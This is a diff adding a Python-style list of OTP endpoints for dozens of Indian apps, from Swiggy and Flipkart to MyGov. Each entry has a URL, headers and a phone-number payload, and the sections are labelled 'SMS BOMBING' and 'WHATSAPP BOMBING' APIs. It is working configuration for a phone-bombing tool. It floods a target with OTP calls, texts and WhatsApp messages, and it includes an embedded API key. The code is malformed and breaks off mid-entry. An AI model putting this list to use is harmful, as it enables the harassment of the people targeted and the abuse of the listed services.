@@ -1,0 +1,1023 @@
+{ 
+  [
+    {
+        "name": "Tata Capital Voice Call",
+        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
+    },
+    {
+        "name": "1MG Voice Call", 
+        "url": "https://www.1mg.com/auth_api/v6/create_token",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=utf-8"},
+        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
+    },
+    {
+        "name": "Swiggy Call Verification",
+        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=utf-8"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Myntra Voice Call",
+        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
+        "method": "POST", 
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Flipkart Voice Call",
+        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Amazon Voice Call",
+        "url": "https://www.amazon.in/ap/signin",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&action=voice_otp"
+    },
+    {
+        "name": "Paytm Voice Call",
+        "url": "https://accounts.paytm.com/signin/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Zomato Voice Call",
+        "url": "https://www.zomato.com/php/o2_api_handler.php",
+        "method": "POST", 
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"phone={phone}&type=voice"
+    },
+    {
+        "name": "MakeMyTrip Voice Call",
+        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Goibibo Voice Call",
+        "url": "https://www.goibibo.com/user/voice-otp/generate/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Ola Voice Call",
+        "url": "https://api.olacabs.com/v1/voice-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Uber Voice Call",
+        "url": "https://auth.uber.com/v2/voice-otp", 
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+
+    # WHATSAPP BOMBING APIS (100+)
+    {
+        "name": "KPN WhatsApp",
+        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+        "method": "POST", 
+        "headers": {
+            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
+            "content-type": "application/json; charset=UTF-8",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
+    },
+    {
+        "name": "Foxy WhatsApp",
+        "url": "https://www.foxy.in/api/v2/users/send_otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
+    },
+    {
+        "name": "Stratzy WhatsApp", 
+        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
+    },
+    {
+        "name": "Jockey WhatsApp",
+        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Rappi WhatsApp",
+        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
+    },
+    {
+        "name": "Eka Care WhatsApp",
+        "url": "https://auth.eka.care/auth/init",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
+    },
+
+    # SMS BOMBING APIS (1000+)  
+    {
+        "name": "Lenskart SMS",
+        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
+    },
+    {
+        "name": "NoBroker SMS",
+        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"phone={phone}&countryCode=IN"
+    },
+    {
+        "name": "PharmEasy SMS",
+        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Wakefit SMS",
+        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Byju's SMS",
+        "url": "https://api.byjus.com/v2/otp/send",
+        "method": "POST", 
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Hungama OTP",
+        "url": "https://communication.api.hungama.com/v1/communication/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
+    },
+    {
+        "name": "Meru Cab",
+        "url": "https://merucabapp.com/api/otp/generate", 
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"mobile_number={phone}"
+    },
+    {
+        "name": "Doubtnut",
+        "url": "https://api.doubtnut.com/v4/student/login",
+        "method": "POST",
+        "headers": {"content-type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
+    },
+    {
+        "name": "PenPencil",
+        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+        "method": "POST", 
+        "headers": {"content-type": "application/json; charset=utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
+    },
+    {
+        "name": "Snitch",
+        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
+    },
+    {
+        "name": "Dayco India",
+        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
+    },
+    {
+        "name": "BeepKart",
+        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
+    },
+    {
+        "name": "Lending Plate",
+        "url": "https://lendingplate.com/api.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"mobiles={phone}&resend=Resend"
+    },
+    {
+        "name": "ShipRocket",
+        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
+    },
+    {
+        "name": "GoKwik",
+        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
+    },
+    {
+        "name": "NewMe",
+        "url": "https://prodapi.newme.asia/web/otp/request",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
+    },
+    {
+        "name": "Univest",
+        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Smytten",
+        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
+    },
+    {
+        "name": "CaratLane",
+        "url": "https://www.caratlane.com/cg/dhevudu",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
+    },
+    {
+        "name": "BikeFixup",
+        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
+    },
+    {
+        "name": "WellAcademy",
+        "url": "https://wellacademy.in/store/api/numberLoginV2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
+    },
+    {
+        "name": "ServeTel",
+        "url": "https://api.servetel.in/v1/auth/otp",
+        "method": "POST", 
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"mobile_number={phone}"
+    },
+    {
+        "name": "GoPink Cabs",
+        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
+    },
+    {
+        "name": "Shemaroome",
+        "url": "https://www.shemaroome.com/users/resend_otp", 
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"mobile_no=%2B91{phone}"
+    },
+    {
+        "name": "Cossouq",
+        "url": "https://www.cossouq.com/mobilelogin/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
+    },
+    {
+        "name": "MyImagineStore",
+        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"mobile={phone}"
+    },
+    {
+        "name": "Otpless",
+        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
+    },
+    {
+        "name": "MyHubble Money",
+        "url": "https://api.myhubble.money/v1/auth/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
+    },
+    {
+        "name": "Tata Capital Business",
+        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
+    },
+    {
+        "name": "DealShare",
+        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
+    },
+    {
+        "name": "Snapmint",
+        "url": "https://api.snapmint.com/v1/public/sign_up",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Housing.com",
+        "url": "https://login.housing.com/api/v2/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
+    },
+    {
+        "name": "RentoMojo",
+        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Khatabook",
+        "url": "https://api.khatabook.com/v1/auth/request-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
+    },
+    {
+        "name": "Netmeds",
+        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Nykaa",
+        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
+    },
+    {
+        "name": "RummyCircle",
+        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
+    },
+    {
+        "name": "Animall",
+        "url": "https://animall.in/zap/auth/login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
+    },
+    {
+        "name": "PenPencil V3",
+        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Entri",
+        "url": "https://entri.app/api/v3/users/check-phone/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}"}}'
+    },
+    {
+        "name": "Cosmofeed",
+        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
+    },
+    {
+        "name": "Aakash",
+        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
+    },
+    {
+        "name": "Revv",
+        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
+    },
+    {
+        "name": "DeHaat",
+        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
+    },
+    {
+        "name": "A23 Games",
+        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
+    },
+    {
+        "name": "Spencer's",
+        "url": "https://jiffy.spencers.in/user/auth/otp/send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "PayMe India",
+        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
+    },
+    {
+        "name": "Shopper's Stop",
+        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
+    },
+    {
+        "name": "Hyuga Auth",
+        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "BigCash",
+        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
+        "method": "GET",
+        "headers": {"Referer": "https://www.bigcash.live/games/poker", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Lifestyle Stores",
+        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
+    },
+    {
+        "name": "WorkIndia",
+        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "PokerBaazi",
+        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
+    },
+    {
+        "name": "My11Circle",
+        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json;charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "MamaEarth",
+        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "HomeTriangle",
+        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Wellness Forever",
+        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
+    },
+    {
+        "name": "HealthMug",
+        "url": "https://api.healthmug.com/account/createotp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Vyapar",
+        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Kredily",
+        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "Tata Motors",
+        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
+    },
+    {
+        "name": "Moglix",
+        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
+    },
+    {
+        "name": "MyGov",
+        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "TrulyMadly",
+        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
+    },
+    {
+        "name": "Apna",
+        "url": "https://production.apna.co/api/userprofile/v1/otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
+    },
+    {
+        "name": "CodFirm",
+        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Swipe",
+        "url": "https://app.getswipe.in/api/user/mobile_login",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
+    },
+    {
+        "name": "More Retail",
+        "url": "https://omni-api.moreretail.in/api/v1/login/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'
+    },
+    {
+        "name": "Country Delight",
+        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
+    },
+    {
+        "name": "AstroSage",
+        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Rapido",
+        "url": "https://customer.rapido.bike/api/otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    {
+        "name": "TooToo",
+        "url": "https://tootoo.in/graphql",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}'
+    },
+    {
+        "name": "ConfirmTkt",
